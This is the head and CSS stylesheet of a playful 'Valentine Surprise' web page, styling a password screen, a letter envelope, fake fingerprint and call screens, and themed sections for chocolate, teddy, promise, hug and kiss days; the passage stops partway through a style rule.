<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Valentine Surprise</title>
    <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Pacifico&family=Poppins:wght@300;600&display=swap" rel="stylesheet">
    <meta name="theme-color" content="#ffe5ec">
    
    <style>
        :root {
            --bg-color: #ffe5ec;
            --envelope-main: #ffb7c5;
            --envelope-flap: #f896b1;
            --highlight: #ff4d6d;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            background: linear-gradient(135deg, #ffe5ec 0%, #ffc2d1 100%);
            min-height: 100dvh; /* Mobile browser friendly height */
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            /* justify-content: center; REMOVED FOR MOBILE SCROLLING */
            font-family: 'Poppins', sans-serif; 
            overflow-x: hidden; /* Only hide horizontal scroll */
            overflow-y: auto;   /* Allow vertical scroll */
            transition: background 1s ease;
            padding-top: 20px; /* Top spacing */
        }

        /* --- STYLISH POPUP --- */
        .popup-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.6); z-index: 20000;
            display: none; justify-content: center; align-items: center;
            backdrop-filter: blur(8px);
        }
        
        .popup-box {
            background: rgba(255, 255, 255, 0.9); 
            backdrop-filter: blur(10px);
            padding: 30px; border-radius: 20px;
            text-align: center; max-width: 320px; width: 85%;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.15);
            border: 1px solid rgba(255, 255, 255, 0.5);
            animation: popIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            position: relative;
        }

        @keyframes popIn {
            from { opacity: 0; transform: scale(0.5); }
            to { opacity: 1; transform: scale(1); }
        }

        .popup-box h3 { color: #d90429; font-family: 'Pacifico', cursive; font-size: 1.8rem; margin-bottom: 10px; display: flex; align-items: center; justify-content: center; gap: 10px; }
        .popup-box p { color: #555; font-size: 1rem; line-height: 1.6; margin-bottom: 20px; }
        .popup-btn {
            background: #ff4d6d; color: white; border: none;
            padding: 10px 25px; border-radius: 50px;
            font-size: 1rem; font-weight: bold; cursor: pointer;
            box-shadow: 0 5px 15px rgba(255, 77, 109, 0.3);
            transition: transform 0.2s;
        }
        .popup-btn:active { transform: scale(0.95); }

        /* --- LOGIN SCREEN --- */
        #login-screen {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(135deg, #ffe5ec 0%, #ffc2d1 100%); z-index: 9999;
            display: flex; flex-direction: column; justify-content: center; align-items: center;
        }
        .login-box {
            background: rgba(255, 255, 255, 0.8); 
            backdrop-filter: blur(15px);
            padding: 40px 30px; border-radius: 25px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.1); text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.4);
        }
        .login-box h2 { color: #ff4d6d; font-family: 'Pacifico', cursive; margin-bottom: 20px; display: flex; align-items: center; justify-content: center; gap: 10px; }
        .pass-input {
            padding: 12px 15px; border: 2px solid #ffb7c5; border-radius: 12px;
            font-size: 16px; /* Prevents zoom on iPhone */ outline: none; width: 220px; text-align: center;
            background: rgba(255, 255, 255, 0.9); transition: 0.3s;
        }
        .pass-input:focus { border-color: #ff4d6d; box-shadow: 0 0 10px rgba(255, 77, 109, 0.2); }
        .enter-btn {
            margin-top: 15px; padding: 10px 25px; background: #ff4d6d;
            color: white; border: none; border-radius: 20px; font-weight: bold;
            cursor: pointer; transition: 0.3s;
        }
        .enter-btn:hover { background: #d90429; }

        /* --- MAIN STYLES --- */
        .bg-hearts { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 0; }
        .heart { position: absolute; bottom: -50px; animation: float 10s linear infinite; opacity: 0.6; }
        @keyframes float { to { transform: translateY(-110vh) rotate(360deg); } }

        .music-btn {
            position: fixed; top: 20px; right: 20px; width: 45px; height: 45px;
            background: rgba(255, 255, 255, 0.9); backdrop-filter: blur(5px);
            border-radius: 50%; display: flex; justify-content: center; align-items: center;
            box-shadow: 0 8px 20px rgba(0,0,0,0.15); cursor: pointer; z-index: 1000; font-size: 1.2rem;
            animation: pulse 2s infinite; display: none;
        }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }

        #menu-screen { text-align: center; width: 100%; max-width: 800px; z-index: 100; transition: 0.5s; padding: 20px; display: none; padding-bottom: 100px; }
        .title-container h1 { font-family: 'Pacifico', cursive; font-size: 2.5rem; color: #d90429; text-shadow: 2px 2px 0 #fff; margin-bottom: 5px; display: flex; align-items: center; justify-content: center; gap: 10px; }
        #love-timer { font-size: 0.9rem; background: rgba(255,255,255,0.7); padding: 8px 15px; border-radius: 20px; display: inline-flex; align-items: center; gap: 5px; margin-bottom: 25px; color: #d90429; font-weight: 600; }
        
        /* SVG Icons Utility */
        .svg-icon { width: 1.2em; height: 1.2em; fill: currentColor; vertical-align: middle; display: inline-block; }
        
        .grid-container { 
            display: grid; 
            grid-template-columns: repeat(2, 1fr); /* Force 2 columns on mobile */
            gap: 15px; 
            padding-bottom: 80px; /* UPDATED: Increased padding for scrolling space */
        }
        .card { 
            background: rgba(255,255,255,0.7); backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.5);
            border-radius: 20px; padding: 20px 15px; cursor: pointer; 
            box-shadow: 0 10px 25px rgba(0,0,0,0.05); transition: 0.3s; text-align: center; position: relative;
        }
        .card:active { transform: scale(0.95); } /* Mobile touch feedback */
        .home-img {
            width: 100%;
            height: 120px;
            object-fit: cover;
            border-radius: 12px;
            margin-bottom: 10px;
        }
        .icon { display: block; margin-bottom: 10px; color: var(--highlight); }
        .icon svg { width: 40px; height: 40px; }
        .locked-badge { position: absolute; top: 5px; right: 5px; font-size: 1rem; }

        #letter-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; display: none; justify-content: center; align-items: center; background: rgba(0,0,0,0.5); backdrop-filter: blur(5px); z-index: 200; }
        .back-btn { position: absolute; top: 20px; left: 20px; background: #fff; padding: 8px 15px; border-radius: 20px; border: none; font-weight: bold; cursor: pointer; }

        .envelope-wrapper { position: relative; display: flex; justify-content: center; align-items: center; }
        .envelope { position: relative; width: 300px; height: 200px; background: var(--envelope-main); box-shadow: 0 20px 40px rgba(0,0,0,0.3); cursor: pointer; transition: 0.8s; z-index: 10; }
        .flap { position: absolute; top: 0; width: 100%; height: 100%; background: var(--envelope-flap); clip-path: polygon(0 0, 100% 0, 50% 50%); transform-origin: top; transition: 0.5s; z-index: 11; }
        .envelope.open .flap { transform: rotateX(180deg); }
        .envelope.open { transform: translateY(200px) scale(0); opacity: 0; }
        
        .letter-card { 
            position: absolute; 
            top: 50%; left: 50%; 
            width: 90vw; max-width: 400px; 
            height: 75vh; max-height: 600px; 
            background: #fff; 
            padding: 20px; 
            border-radius: 10px; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.3); 
            transform: translate(-50%, -50%) scale(0); /* Centered and hidden */
            transition: 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275); 
            display: flex; flex-direction: column; overflow-y: auto; z-index: 20; 
        }
        .letter-card.show { transform: translate(-50%, -50%) scale(1); } /* Centered and shown */
        .photo-frame { width: 100%; background: #fff; padding: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.15); transform: rotate(-2deg); margin: 10px 0 20px 0; border: 1px solid #eee; flex-shrink: 0; position: relative; }
        .photo-frame img { width: 100%; height: 220px; object-fit: cover; border-radius: 4px; display: block; }
        #scratch-canvas {
            position: absolute;
            top: 8px;
            left: 8px;
            width: calc(100% - 16px);
            height: 220px;
            border-radius: 4px;
            z-index: 10;
        }
        .content { font-family: 'Dancing Script', cursive; color: #444; text-align: left; padding: 0 10px; }
        .day-title { font-family: 'Pacifico', cursive; color: var(--highlight); text-align: center; font-size: 1.8rem; margin-bottom: 15px; }
        .message-text { font-size: 1.3rem; line-height: 1.5; min-height: 100px; }
        .cursor { display: inline-block; width: 2px; height: 1.2rem; background: #444; animation: blinkCur 0.8s infinite; }
        @keyframes blinkCur { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }

        /* --- SURPRISE BUTTONS --- */
        .interaction-container { margin-top: 15px; text-align: center; min-height: 60px; position: relative; display: flex; justify-content: center; align-items: center; gap: 15px; }
        .choice-btn { padding: 10px 25px; border-radius: 50px; border: none; font-weight: bold; cursor: pointer; color: #fff; transition: 0.3s; font-size: 1rem; box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
        .btn-yes { background: #ff4d6d; }
        .btn-no { background: #555; position: relative; } 
        .share-btn { background: #25D366; color: white; border: none; padding: 10px; border-radius: 10px; font-weight: bold; margin-top: 20px; cursor: pointer; width: 100%; display: flex; align-items: center; justify-content: center; gap: 8px; font-size: 0.9rem; box-shadow: 0 5px 10px rgba(37, 211, 102, 0.2); }

        /* --- NEW UNIQUE FEATURES --- */
        /* 1. HEART SCANNER OVERLAY */
        #scanner-screen {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.95); z-index: 30000;
            display: none; flex-direction: column; justify-content: center; align-items: center;
            color: #fff; text-align: center;
        }
        .scanner-container {
            width: 120px; height: 120px; border: 2px solid rgba(255, 77, 109, 0.3);
            border-radius: 50%; display: flex; justify-content: center; align-items: center;
            position: relative; margin-bottom: 20px; transition: 0.3s; cursor: pointer;
            box-shadow: 0 0 30px rgba(255, 77, 109, 0.1);
        }
        .scanner-container.active { border-color: #ff4d6d; box-shadow: 0 0 50px rgba(255, 77, 109, 0.6); transform: scale(1.1); }
        .scan-finger { opacity: 0.5; transition: 0.3s; display: flex; justify-content: center; align-items: center; }
        .scan-finger svg { width: 60px; height: 60px; fill: #ff4d6d; }
        .scanner-container.active .scan-finger { opacity: 1; color: #ff4d6d; }
        
        .scan-line {
            position: absolute; width: 100%; height: 2px; background: #ff4d6d;
            top: 0; left: 0; box-shadow: 0 0 10px #ff4d6d;
            display: none; animation: scanAnim 1.5s linear infinite;
        }
        @keyframes scanAnim { 0% { top: 0%; opacity: 0; } 50% { opacity: 1; } 100% { top: 100%; opacity: 0; } }
        
        .scan-msg { font-family: 'Poppins', sans-serif; font-size: 1rem; color: #aaa; letter-spacing: 1px; }
        .scan-progress { width: 200px; height: 4px; background: #333; border-radius: 10px; margin-top: 15px; overflow: hidden; }
        .scan-bar { width: 0%; height: 100%; background: #ff4d6d; transition: width 0.1s linear; }

        #confetti-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 9999; }
        .cursor-heart {
            position: fixed; pointer-events: none; width: 20px; height: 20px; color: #ff4d6d; 
            animation: floatUp 0.8s ease-out forwards; z-index: 999; 
        }
        @keyframes floatUp {
            to { transform: translateY(-40px) scale(1.5); opacity: 0; }
        }
        
        @keyframes shake {
            0% { transform: translate(1px, 1px) rotate(0deg); }
            10% { transform: translate(-1px, -2px) rotate(-1deg); }
            20% { transform: translate(-3px, 0px) rotate(1deg); }
            30% { transform: translate(3px, 2px) rotate(0deg); }
            40% { transform: translate(1px, -1px) rotate(1deg); }
            50% { transform: translate(-1px, 2px) rotate(-1deg); }
            60% { transform: translate(-3px, 1px) rotate(0deg); }
            70% { transform: translate(3px, 1px) rotate(-1deg); }
            80% { transform: translate(-1px, -1px) rotate(1deg); }
            90% { transform: translate(1px, 2px) rotate(0deg); }
            100% { transform: translate(1px, -2px) rotate(-1deg); }
        }

        /* --- FINGERPRINT VERIFICATION --- */
        .fp-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.6); backdrop-filter: blur(8px);
            z-index: 25000; display: none; flex-direction: column;
            justify-content: center; align-items: center;
            animation: fadeIn 0.3s ease-out;
        }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        
        .fp-container { position: relative; width: 120px; height: 120px; display: flex; justify-content: center; align-items: center; margin-bottom: 20px; }
        
        .fp-ring-svg { position: absolute; top: 0; left: 0; width: 100%; height: 100%; transform: rotate(-90deg); }
        .fp-ring-bg { fill: none; stroke: rgba(255,255,255,0.2); stroke-width: 4; }
        .fp-ring-progress { 
            fill: none; stroke: var(--highlight); stroke-width: 4; 
            stroke-dasharray: 339.292; stroke-dashoffset: 339.292; /* 2 * PI * 54 */
            transition: stroke-dashoffset 0.1s linear;
        }
        
        .fp-icon-btn {
            width: 90px; height: 90px; background: rgba(255,255,255,0.9);
            border-radius: 50%; display: flex; justify-content: center; align-items: center;
            position: relative; cursor: pointer; overflow: hidden;
            box-shadow: 0 0 20px rgba(255,255,255,0.3);
            transition: transform 0.2s, box-shadow 0.3s;
            -webkit-tap-highlight-color: transparent;
        }
        .fp-icon-btn.pulsing { animation: fpPulse 2s infinite; }
        @keyframes fpPulse { 0% { box-shadow: 0 0 0 0 rgba(255, 77, 109, 0.4); } 70% { box-shadow: 0 0 0 20px rgba(255, 77, 109, 0); } 100% { box-shadow: 0 0 0 0 rgba(255, 77, 109, 0); } }
        
        .fp-thumb-svg { width: 50px; height: 50px; fill: #ccc; transition: fill 0.3s; }
        .fp-icon-btn.active .fp-thumb-svg { fill: var(--highlight); }
        .fp-icon-btn.success .fp-thumb-svg { fill: #25D366; }
        
        .fp-scan-line {
            position: absolute; width: 100%; height: 2px; background: var(--highlight);
            top: 0; left: 0; box-shadow: 0 0 8px var(--highlight);
            display: none; animation: scanMove 1.5s linear infinite;
        }
        @keyframes scanMove { 0% { top: 0%; opacity: 0; } 50% { opacity: 1; } 100% { top: 100%; opacity: 0; } }
        
        .fp-status {
            font-family: 'Poppins', sans-serif; font-size: 1.1rem; color: #fff;
            text-align: center; font-weight: 600; letter-spacing: 1px;
            text-shadow: 0 2px 4px rgba(0,0,0,0.5); min-height: 1.5em;
        }
        
        .shake-anim { animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both; }
        
        /* Disable text selection during hold */
        .noselect {
            -webkit-touch-callout: none; -webkit-user-select: none;
            -khtml-user-select: none; -moz-user-select: none;
            -ms-user-select: none; user-select: none;
        }

        /* --- INCOMING CALL SCREEN --- */
        .call-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(135deg, #2c3e50, #000);
            z-index: 30000; display: none; flex-direction: column;
            justify-content: space-between; align-items: center;
            padding: 80px 20px; color: white;
            animation: slideUp 0.5s ease-out;
        }
        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
        
        .caller-avatar {
            width: 150px; height: 150px; border-radius: 50%; border: 4px solid rgba(255,255,255,0.2);
            object-fit: cover; margin-bottom: 20px;
            box-shadow: 0 0 30px rgba(255,255,255,0.3);
            animation: pulseAvatar 2s infinite;
        }
        @keyframes pulseAvatar { 0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255,255,255,0.4); } 70% { transform: scale(1.05); box-shadow: 0 0 0 30px rgba(255,255,255,0); } 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255,255,255,0); } }

        .caller-info { text-align: center; margin-top: 40px; }
        .caller-info h2 { font-size: 2.2rem; font-weight: 600; margin-bottom: 10px; letter-spacing: 1px; }
        .caller-info p { font-size: 1.2rem; opacity: 0.8; font-weight: 300; }

        .call-actions { display: flex; gap: 60px; margin-bottom: 60px; }
        .call-btn {
            width: 75px; height: 75px; border-radius: 50%; border: none;
            display: flex; justify-content: center; align-items: center;
            cursor: pointer; color: white; font-size: 1.5rem;
            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
            transition: transform 0.2s;
        }
        .call-btn:active { transform: scale(0.9); }
        .call-btn.decline { background: #ff3b30; }
        .call-btn.accept { background: #34c759; animation: bounceCall 1.2s infinite; }
        @keyframes bounceCall { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }

        /* --- PROPOSE DAY SPECIAL --- */
        .courage-line {
            font-family: 'Poppins', sans-serif; font-size: 1.1rem; color: #666;
            min-height: 1.5em; display: block; margin-bottom: 15px;
        }
        .proposal-final {
            font-family: 'Dancing Script', cursive; font-size: 1.6rem; color: #d90429;
            opacity: 0; transform: translateY(15px); transition: all 1.5s ease-out;
            line-height: 1.6;
        }
        .proposal-final.visible { opacity: 1; transform: translateY(0); }

        /* --- CHOCOLATE DAY SPECIAL --- */
        .choco-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; width: 100%; max-width: 340px; margin: 0 auto; transition: opacity 1s; }
        .choco-piece { 
            width: 100%; aspect-ratio: 1; background: #5d4037; border-radius: 4px; 
            cursor: pointer; transition: opacity 0.5s ease, transform 0.5s ease; 
            box-shadow: inset 2px 2px 5px rgba(255,255,255,0.1), 2px 2px 5px rgba(0,0,0,0.2); 
            position: relative;
        }
        .choco-piece::after {
            content: ''; position: absolute; top: 20%; left: 20%; width: 60%; height: 60%;
            border: 1px solid rgba(255,255,255,0.1); border-radius: 2px;
        }
        .choco-piece.eaten { opacity: 0; transform: scale(0.8); pointer-events: none; }
        
        .choco-options { 
            display: flex; justify-content: center; gap: 40px; margin-top: 25px; 
            opacity: 0; pointer-events: none; transition: opacity 1.5s ease; 
        }
        .choco-options.visible { opacity: 1; pointer-events: auto; }
        
        .choco-opt { 
            font-family: 'Poppins', sans-serif; font-size: 1.1rem; color: #5d4037; 
            cursor: pointer; opacity: 0.6; transition: all 0.4s ease; 
            letter-spacing: 1px; position: relative; padding-bottom: 2px;
        }
        .choco-opt:hover { opacity: 1; transform: translateY(-2px); }
        .choco-opt::after {
            content: ''; position: absolute; bottom: 0; left: 0; width: 0; height: 1px;
            background: #5d4037; transition: width 0.3s;
        }
        .choco-opt:hover::after { width: 100%; }
        
        .choco-msg { 
            font-family: 'Dancing Script', cursive; font-size: 1.5rem; color: #5d4037; 
            margin-top: 20px; opacity: 0; transition: opacity 1.5s ease; min-height: 1.5em;
        }
        .choco-msg.visible { opacity: 1; }

        /* --- BIG CHOCOLATE UPDATE --- */
        .floating-compliment {
            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
            width: 100%; text-align: center; color: #fff; font-family: 'Dancing Script', cursive;
            font-size: 1.2rem; font-weight: bold; pointer-events: none; text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
            animation: floatUpReveal 1.5s ease-out forwards; z-index: 10;
        }
        @keyframes floatUpReveal {
            0% { opacity: 0; transform: translate(-50%, -50%) scale(0.5); }
            50% { opacity: 1; transform: translate(-50%, -100%) scale(1.2); }
            100% { opacity: 0; transform: translate(-50%, -200%) scale(1); }
        }

        .big-choco-img {
            width: 80%; max-width: 280px; height: auto;
            display: block; margin: 10px auto;
            filter: drop-shadow(0 10px 15px rgba(0,0,0,0.3));
            animation: floatChoco 3s ease-in-out infinite;
        }
        @keyframes floatChoco { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }

        .choco-btn-container { display: flex; justify-content: center; gap: 20px; margin-top: 15px; }
        .choco-btn {
            padding: 12px 30px; border: none; border-radius: 50px;
            font-family: 'Poppins', sans-serif; font-weight: 600; font-size: 1rem;
            cursor: pointer; transition: transform 0.2s, box-shadow 0.2s; color: white;
        }
        .choco-btn:active { transform: scale(0.95); }
        .choco-btn.share { background: #ff4d6d; box-shadow: 0 5px 15px rgba(255, 77, 109, 0.3); }
        .choco-btn.eat { background: #5d4037; box-shadow: 0 5px 15px rgba(93, 64, 55, 0.3); }

        /* Final Piece Animations */
        .slide-away { animation: slideRight 1s forwards; }
        @keyframes slideRight { to { transform: translateX(50px); opacity: 0; } }
        
        .dissolve { animation: dissolveAnim 1.5s forwards; }
        @keyframes dissolveAnim { to { transform: scale(1.2); opacity: 0; filter: blur(4px); } }

        /* --- TEDDY DAY SPECIAL --- */
        .teddy-wrapper { position: relative; display: inline-block; transition: transform 3s cubic-bezier(0.25, 0.1, 0.25, 1); cursor: grab; }
        .teddy-wrapper:active { cursor: grabbing; }
        .teddy-wrapper.holding { transform: scale(0.85); }
        .teddy-glow { 
            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
            width: 100px; height: 100px; border-radius: 50%; 
            background: radial-gradient(circle, rgba(255, 143, 171, 0.5) 0%, rgba(255, 143, 171, 0) 70%);
            opacity: 0; transition: opacity 2s ease, width 2s ease, height 2s ease;
            pointer-events: none; z-index: -1;
        }
        .teddy-wrapper.holding .teddy-glow { opacity: 1; width: 180px; height: 180px; }
        .teddy-msg { 
            font-family: 'Poppins', sans-serif; font-size: 1rem; color: #888; 
            margin-top: 20px; opacity: 0; transition: opacity 1.5s ease; min-height: 1.5em; letter-spacing: 0.5px;
        }
        .teddy-msg.visible { opacity: 1; }

        /* --- PROMISE DAY SPECIAL --- */
        .promise-container {
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            min-height: 200px; opacity: 0; transition: opacity 2s ease;
        }
        .promise-seal {
            width: 100px; height: 100px; border-radius: 50%;
            background: #e0e0e0; border: 4px solid #bbb;
            position: relative; cursor: pointer;
            transition: background 0.5s, transform 0.3s, border-color 0.3s;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
            display: flex; justify-content: center; align-items: center;
            -webkit-tap-highlight-color: transparent;
        }
        .promise-seal::before {
            content: ''; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
            width: 80%; height: 80%; border-radius: 50%; border: 2px dashed #bbb;
            transition: border-color 0.3s;
        }
        /* Slow fill effect during hold */
        .promise-seal.holding {
            background: #888; /* Darkens to show weight */
            transition: background 4.5s linear; 
            transform: scale(0.95);
        }
        .promise-seal.sealed {
            background: #0077b6; border-color: #005f87;
            box-shadow: 0 0 20px rgba(0, 119, 182, 0.4);
            cursor: default; transition: background 0.5s;
        }
        .promise-seal.sealed::before {
            border-color: rgba(255,255,255,0.3); border-style: solid;
        }
        .promise-seal-icon {
            width: 50px; height: 50px; fill: #bbb; transition: fill 0.5s;
        }
        .promise-seal.sealed .promise-seal-icon { fill: #fff; }
        .promise-msg {
            font-family: 'Poppins', sans-serif; font-size: 1.1rem; color: #555;
            margin-top: 30px; opacity: 0; transition: opacity 1.5s ease;
            text-align: center; font-weight: 600; letter-spacing: 0.5px; min-height: 1.5em;
        }
        .promise-msg.visible { opacity: 1; }

        .promise-strength {
            width: min(100%, 380px);
            background: rgba(0, 119, 182, 0.08);
            border: 1px solid rgba(0, 119, 182, 0.2);
            border-radius: 14px;
            padding: 12px;
            margin-bottom: 16px;
            text-align: left;
        }
        .promise-strength-head {
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 0.8rem;
            font-weight: 600;
            color: #005f87;
            letter-spacing: 0.4px;
        }
        .promise-strength-track {
            margin-top: 8px;
            height: 10px;
            width: 100%;
            border-radius: 999px;
            background: rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }
        .promise-strength-fill {
            width: 0%;
            height: 100%;
            border-radius: inherit;
            background: linear-gradient(90deg, #adb5bd, #6c757d);
            transition: width 0.12s linear, background 0.25s ease;
        }
        .promise-strength.complete .promise-strength-fill {
            background: linear-gradient(90deg, #4cc9f0, #0077b6);
        }
        .promise-strength-note {
            margin-top: 8px;
            min-height: 1.1em;
            font-size: 0.75rem;
            color: #4f5d75;
            letter-spacing: 0.2px;
        }

        .promise-certificate-panel {
            width: min(100%, 380px);
            margin-top: 20px;
            background: rgba(255, 255, 255, 0.78);
            border: 1px solid rgba(176, 137, 104, 0.35);
            border-radius: 18px;
            padding: 14px;
            box-shadow: 0 10px 22px rgba(79, 93, 117, 0.12);
            opacity: 0;
            transform: translateY(14px);
            pointer-events: none;
            transition: opacity 0.45s ease, transform 0.45s ease;
        }
        .promise-certificate-panel.active {
            opacity: 1;
            transform: translateY(0);
            pointer-events: auto;
        }
        .promise-cert-heading {
            margin-bottom: 10px;
            font-family: 'Georgia', serif;
            font-size: 1rem;
            color: #5d4037;
            letter-spacing: 0.4px;
            text-align: left;
        }
        .promise-cert-form {
            display: grid;
            gap: 8px;
        }
        .promise-cert-input,
        .promise-cert-select,
        .promise-cert-textarea {
            width: 100%;
            border: 1px solid #d8c3a5;
            border-radius: 10px;
            padding: 10px 11px;
            font-size: 0.88rem;
            font-family: 'Poppins', sans-serif;
            color: #4e342e;
            background: rgba(255, 255, 255, 0.92);
            outline: none;
            transition: border-color 0.2s, box-shadow 0.2s;
        }
        .promise-cert-input:focus,
        .promise-cert-select:focus,
        .promise-cert-textarea:focus {
            border-color: #b08968;
            box-shadow: 0 0 0 3px rgba(176, 137, 104, 0.2);
        }
        .promise-cert-textarea {
            min-height: 68px;
            resize: vertical;
        }
        .promise-cert-btn-row {
            display: grid;
            grid-template-columns: repeat(3, minmax(0, 1fr));
            gap: 8px;
            margin-top: 10px;
        }
        .promise-cert-btn {
            border: none;
            border-radius: 10px;
            padding: 10px 8px;
            color: #fff;
            font-weight: 600;
            font-size: 0.8rem;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s, opacity 0.2s;
        }
        .promise-cert-btn:active { transform: scale(0.97); }
        .promise-cert-btn[disabled] {
            cursor: not-allowed;
            opacity: 0.45;
            box-shadow: none;
            transform: none;
        }
        .promise-cert-btn.generate {
            background: #0077b6;
            box-shadow: 0 6px 14px rgba(0, 119, 182, 0.25);
        }
        .promise-cert-btn.share {
            background: #25D366;
            box-shadow: 0 6px 14px rgba(37, 211, 102, 0.25);
        }
        .promise-cert-btn.download {
            background: #ef476f;
            box-shadow: 0 6px 14px rgba(239, 71, 111, 0.25);
        }
        .promise-cert-status {
            min-height: 1.1em;
            margin-top: 8px;
            font-size: 0.75rem;
            color: #4f5d75;
            text-align: left;
        }
        .promise-certificate-preview {
            margin-top: 12px;
            border-radius: 14px;
            border: 1px solid rgba(176, 137, 104, 0.5);
            overflow: hidden;
        }
        .promise-certificate-paper {
            position: relative;
            min-height: 0;
            aspect-ratio: 16 / 10;
            padding: 18px 16px;
            background:
                radial-gradient(circle at 12% 14%, rgba(255, 255, 255, 0.65), transparent 45%),
                radial-gradient(circle at 86% 80%, rgba(255, 255, 255, 0.45), transparent 45%),
                linear-gradient(135deg, #f7ecd0, #eed7b0);
            border: 7px double #b08968;
            color: #4e342e;
        }
        .promise-certificate-paper::before {
            content: "FOREVER";
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%) rotate(-18deg);
            font-family: 'Georgia', serif;
            font-size: 2.2rem;
            color: rgba(176, 137, 104, 0.12);
            letter-spacing: 4px;
            white-space: nowrap;
            pointer-events: none;
        }
        .promise-certificate-paper > * {
            position: relative;
            z-index: 1;
        }
        .promise-cert-title {
            font-family: 'Georgia', serif;
            font-size: 1.25rem;
            font-weight: 700;
            text-align: center;
            letter-spacing: 0.8px;
            color: #5d4037;
            margin-bottom: 4px;
        }
        .promise-cert-subtitle {
            text-align: center;
            font-size: 0.74rem;
            color: #7f5539;
            letter-spacing: 0.6px;
            margin-bottom: 10px;
        }
        .promise-cert-name {
            text-align: center;
            font-family: 'Dancing Script', cursive;
            font-size: 2rem;
            color: #8d0801;
            margin-bottom: 8px;
        }
        .promise-cert-couple {
            text-align: center;
            font-size: 0.8rem;
            color: #7f5539;
            letter-spacing: 0.4px;
            margin-bottom: 4px;
            font-weight: 600;
        }
        .promise-cert-body {
            font-family: 'Georgia', serif;
            font-size: 0.98rem;
            line-height: 1.55;
            text-align: center;
            color: #5f4339;
            min-height: 68px;
        }
        .promise-cert-footer {
            margin-top: 16px;
            display: flex;
            justify-content: space-between;
            align-items: flex-end;
            gap: 10px;
        }
        .promise-cert-date {
            font-size: 0.72rem;
            color: #7f5539;
            margin-bottom: 6px;
        }
        .promise-seal-mark {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            display: grid;
            place-items: center;
            background: radial-gradient(circle at 35% 30%, #cf1b5b, #8d0801 70%);
            color: #fefae0;
            font-size: 0.72rem;
            font-weight: 700;
            letter-spacing: 1px;
            box-shadow: 0 4px 10px rgba(141, 8, 1, 0.35);
        }
        .promise-cert-sign {
            text-align: right;
        }
        .promise-cert-sign span {
            display: block;
            font-size: 0.68rem;
            color: #7f5539;
            margin-bottom: 4px;
        }
        .promise-cert-sign strong {
            font-family: 'Dancing Script', cursive;
            font-size: 1.35rem;
            color: #8d0801;
        }

        @media (max-width: 420px) {
            .promise-cert-btn-row {
                grid-template-columns: 1fr;
            }
        }

        /* --- HUG DAY SPECIAL --- */
        .hug-warmth {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background: radial-gradient(circle at center, rgba(255, 160, 122, 0.4), rgba(255, 218, 185, 0.1));
            opacity: 0; transition: opacity 10s ease-in-out;
            pointer-events: none; z-index: 15; border-radius: 10px;
        }
        .hug-text {
            font-family: 'Poppins', sans-serif; font-size: 1.2rem; color: #555;
            text-align: center; margin-top: 20px; transition: opacity 1s; min-height: 1.5em;
        }

        /* --- KISS DAY SPECIAL --- */
        .kiss-container {
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            min-height: 150px; width: 100%;
            font-family: 'Poppins', sans-serif; font-weight: 300; letter-spacing: 2px;
            color: #555; transition: opacity 1s ease;
        }
        .kiss-text {
            font-size: 1.2rem; opacity: 0; transform: translateY(10px);
            transition: opacity 1.5s ease, transform 1.5s ease;
        }
        .kiss-text.visible { opacity: 1; transform: translateY(0); }
        
        /* Time Suspension & Warmth */
        body.time-suspended, body.time-suspended * {
            animation-play-state: paused !important;
            transition: none !important;
            pointer-events: none !important; /* Freeze input */
        }
        
        @keyframes warmthPulse {
            0% { background-color: rgba(255, 77, 109, 0); }
            50% { background-color: rgba(255, 77, 109, 0.15); }
            100% { background-color: rgba(255, 77, 109, 0); }
        }
        .warmth-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none; z-index: 9999;
            animation: warmthPulse 2s ease-out forwards;
        }

        /* --- VALENTINE'S DAY SPECIAL --- */
        .vday-container {
